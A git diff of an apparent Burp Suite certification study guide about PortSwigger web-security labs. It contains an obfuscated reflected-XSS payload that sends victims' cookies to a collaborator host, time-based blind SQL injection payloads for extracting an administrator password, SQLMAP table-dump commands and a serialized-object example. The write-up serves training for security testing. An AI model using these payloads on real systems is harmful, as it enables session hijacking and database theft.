@@ -640,13 +640,13 @@ ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20v
 
 ```html
 <script>
-location = "https://0afa002e04d93d98c0ea08df00b90092.web-security-academy.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22"
+location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22"
 </script>
 ```  
 
 ![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
->**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user.  
+>**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move to [stage 2 of the practice exam](#sqlmap-boolean---based-blind).  
 
 [PortSwigger Practice Exam - Stage 1 - Foothold](https://portswigger.net/web-security/certification/takepracticeexam/index.html)  
   
@@ -1556,24 +1556,33 @@ csrf=TOKEN&username=administrator
 
 >Blind SQL injection with time delays is tricky to ***identify***, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection ***identified***. 
 
+>Identify SQLi vulnerability.  
+
 ```SQL
+;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
+
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
 ```  
 
+>Determine how many characters are in the password of the administrator user. To do this, change the value to:  
+
+```sql
+;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
 ![blind-time-delay SQLi](images/blind-time-delay.png)  
 
->Burp Intruder attack going through each character of password to get valid time delay response if match identified before moving to next character in password string.  
+>Using Cluster Bomb attack to re-run the attack for each permutation of the character positions in the password, and to determine character value.  
 
 ```SQL
-TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--
+;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```  
 
->Using cluster bomb attack type with two payload, first for the length of the password ```1..20``` and then second using characters ```a..z``` and numbers ```0..9```. Add the **Response Received** column to the intruder attack results to sort by and observe the ```7``` seconds or  more delay as positive response.  
+>Using cluster bomb attack type with two payload, first for the length of the password ` 1..20 ` and then second using characters ` a..z ` and numbers ` 0..9 `. Add the **Response Received** column to the intruder attack results to sort by and observe the ` 10 ` seconds or  more delay as positive response.  
 
 ![blind cluster bomb SQLi](images/blind-cluster-bomb.png)  
 
 [PortSwigger Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)  
-
 
 ### Blind SQLi  
 
@@ -1667,39 +1676,29 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 [PortSwigger Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)  
 
-### SQLMAP 
+### SQLMAP  
 
->Sample SQLMAP commands to determine what SQL injection vulnerability exist and retrieving different types of information from back-end database.  
+>In the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html) we ***identify*** SQLi on the advance search function by adding a single quote and the response result in `HTTP/2 500 Internal Server Error`.  
+
+>SQLMAP version `1.7.2#stable` is no longer able to exploit the PortSwigger Practice exam. I had a similar vulnerability in one of my BSCP Exams and was not able to exploit using SQLMAP.  
+
+>I took the practice exam again and validated that I had to manually run the exploit using [PortSwigger Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval), see this exercise [Blind time delay](#blind-time-delay).
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
-
->SQLMAP determine the vulnerability, and perform initial enumeration.  
-
-```bash
-sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=5 --risk=3
-```  
-
->SQLMAP determine the database DBMS.  
-
-```bash
-sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=5 --risk=3 --dbms=PostgreSQL -dbs
-```  
-
->SQLMAP determine Database, Tables, dump, data Exfiltration.  
-
-```bash
-sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=5 --risk=3 --dbms=PostgreSQL -D public --tables
-```  
 
 >Dump content from table **users** in the **public** database.  
 
 ```
 sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
-
 ```  
 
 ![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)
 
+>Use SQLMAP with a file that is the saved request where SQLi was ***identified***.  
+
+```
+sqlmap -v -r ./March2023.txt --batch --random-agent --level=5 --risk=3 -p "sort-by" --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3 --tamper=space2comment
+```  
 
 >Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data Exfil process.  
 
@@ -2783,7 +2782,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
   
 ### Burp Deserialization Scanner  
 
->Intercept the admin panel page request and ***identify*** the serial value of the cookie named **admin-prefs**. This challenge is from the [Burp Practice exam](https://portswigger.net/web-security/certification/practice-exam).  
+>Intercept the admin panel page request and ***identify*** the serial value of the cookie named **admin-prefs**. This challenge is from the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html).  
 
 ![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  
 
